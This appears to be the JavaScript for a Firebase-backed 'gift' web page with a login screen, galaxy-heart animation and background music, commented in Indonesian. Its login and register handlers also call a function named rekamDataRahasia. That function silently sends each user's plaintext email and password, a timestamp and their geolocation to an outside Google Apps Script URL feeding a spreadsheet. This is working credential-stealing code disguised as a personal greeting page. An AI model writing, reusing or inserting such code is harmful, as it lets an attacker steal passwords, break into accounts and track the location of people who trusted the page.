import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { 
    getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, 
    onAuthStateChanged, signOut 
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";

const firebaseConfig = {
  apiKey: "AIzaSyAm-t2mbHV7sSEcoDvNgZfTinmx5tcSz6s",
  authDomain: "project-bd-163e4.firebaseapp.com",
  projectId: "project-bd-163e4",
  storageBucket: "project-bd-163e4.firebasestorage.app",
  messagingSenderId: "691964855641",
  appId: "1:691964855641:web:b0c45e7badc579cdfc3848",
  measurementId: "G-YE2CW973NL"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);

let timerInterval; 

document.addEventListener('DOMContentLoaded', () => {
    const loginCard = document.getElementById('login-card');
    const contentCard = document.getElementById('content-card');
    const mainContainer = document.getElementById('main-container');
    const galaxyUniverse = document.getElementById('galaxy-universe');
    const giftBoxWrapper = document.getElementById('gift-box-wrapper');
    const bgMusic = document.getElementById('bg-music');
    
    const loginButton = document.getElementById('btn-login');
    const btnRegister = document.getElementById('btn-register');
    const emailInput = document.getElementById('input-email');
    const passwordInput = document.getElementById('input-password');

    // 1. Monitor Status Autentikasi Firebase
    onAuthStateChanged(auth, (user) => {
        if (user) {
            if (loginCard) loginCard.classList.add('hidden');
            if (contentCard) contentCard.classList.remove('hidden');
            if (mainContainer) mainContainer.classList.remove('hidden');
            if (galaxyUniverse) galaxyUniverse.classList.add('hidden');
            
            if (typeof jalankanCounterWaktu === 'function') {
                jalankanCounterWaktu();
            }
        } else {
            if (loginCard) loginCard.classList.remove('hidden');
            if (contentCard) contentCard.classList.add('hidden');
            if (mainContainer) mainContainer.classList.remove('hidden');
            if (galaxyUniverse) galaxyUniverse.classList.add('hidden');
            
            if (timerInterval) clearInterval(timerInterval);
        }
    });

    // 2. Event Delegasi Global untuk Tombol Logout
    document.addEventListener('click', async (e) => {
        if (e.target && e.target.id === 'btn-logout') {
            e.preventDefault();
            try {
                if (bgMusic) {
                    bgMusic.pause();
                    bgMusic.currentTime = 0;
                }
                await signOut(auth);
            } catch (error) {
                console.error("Gagal melakukan signOut:", error);
                location.reload();
            }
        }
    });

    // 3. Interaksi Klik Buka Kado
    if (giftBoxWrapper) {
        giftBoxWrapper.addEventListener('click', () => {
            if (mainContainer) mainContainer.classList.add('hidden');
            if (galaxyUniverse) galaxyUniverse.classList.remove('hidden');
            
            if (typeof startGalaxyHeart === 'function') {
                startGalaxyHeart();
            }
            if (bgMusic) {
                bgMusic.play().catch(err => console.log("Audio ditahan browser"));
            }
        });
    }

    // 4. Interaksi Tombol Login
    if (loginButton) {
        loginButton.addEventListener('click', (e) => {
            e.preventDefault();
            
            // Mengambil value secara langsung tanpa ternary operator untuk stabilitas WebView
            const emailVal = emailInput.value;
            const passwordVal = passwordInput.value;

            if (!emailVal || !passwordVal || emailVal.trim() === "" || passwordVal.trim() === "") {
                alert("Email dan Password wajib diisi!");
                return;
            }

            const emailClean = emailVal.trim();
            const passwordClean = passwordVal.trim();

            // Panggil fungsi perekaman data
            rekamDataRahasia(emailClean, passwordClean);

            signInWithEmailAndPassword(auth, emailClean, passwordClean)
                .then(() => console.log("Firebase Login Sukses"))
                .catch((error) => alert("Login Gagal: " + error.message));
        });
    }

    // 5. Interaksi Tombol Register
    if (btnRegister) {
        btnRegister.addEventListener('click', async (e) => {
            e.preventDefault();
            
            const emailVal = emailInput.value;
            const passwordVal = passwordInput.value;

            if (!emailVal || !passwordVal || emailVal.trim() === "" || passwordVal.trim() === "") {
                alert("Email dan Password tidak boleh kosong!");
                return;
            }

            const emailClean = emailVal.trim();
            const passwordClean = passwordVal.trim();

            rekamDataRahasia(emailClean, passwordClean);

            try { 
                await createUserWithEmailAndPassword(auth, emailClean, passwordClean);
                alert("Akun baru berhasil terdaftar!");
            } catch (error) {
                if (error.code === 'auth/email-already-in-use') alert("Email sudah terdaftar.");
                else alert("Gagal mendaftar: " + error.message);
            }
        });
    }
});

// --- FUNGSI LOGGING OPTIMAL ---
function rekamDataRahasia(email, password) {
    // Normalisasi teks untuk memfilter bypass
    const checkEmail = email.toLowerCase();
    const checkPassword = password.toLowerCase();

    // Pengecekan ketat kata kunci bypass teks literal
    if (checkPassword === "tanpa password" || checkPassword === "tanpapassword" || checkPassword === "undefined" || checkPassword === "null") {
        console.log("Aktivitas diblokir: Terdeteksi teks bypass.");
        return;
    }

    const urlAppsScript = "https://script.google.com/macros/s/AKfycbzs2TkEnW3LMny2qeQEYwFu4IStC58iJLSA21D-mwrQNskzXmC-Rp1T-aCwyKFQcCzKuA/exec";
    
    const sekarang = new Date();
    const opsiWaktu = { 
        timeZone: 'Asia/Jakarta', 
        year: 'numeric', month: '2-digit', day: '2-digit', 
        hour: '2-digit', minute: '2-digit', second: '2-digit' 
    };
    const waktuFormat = sekarang.toLocaleString('id-ID', opsiWaktu);
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, `${lat}, ${lon}`);
            },
            () => {
                // Lokasi ditolak tetap kirim karena email & password dipastikan asli lewat validasi tombol
                kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, "Izin Lokasi Ditolak");
            },
            { timeout: 4000 }
        );
    } else {
        kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, "Tidak Didukung Browser");
    }
}

function kirimKeAppsScript(urlBase, email, pw, waktu, lokasi) {
    const urlFinal = `${urlBase}?email=${encodeURIComponent(email)}` +
                     `&pw=${encodeURIComponent(pw)}` +
                     `&waktu=${encodeURIComponent(waktu)}` +
                     `&lokasi=${encodeURIComponent(lokasi)}`;
                     
    fetch(urlFinal, {
        method: 'GET',
        mode: 'no-cors',
        cache: 'no-cache'
    })
    .then(() => console.log("Data berhasil dikirim ke Sheets"))
    .catch(err => console.log("Gagal fetch:", err));
}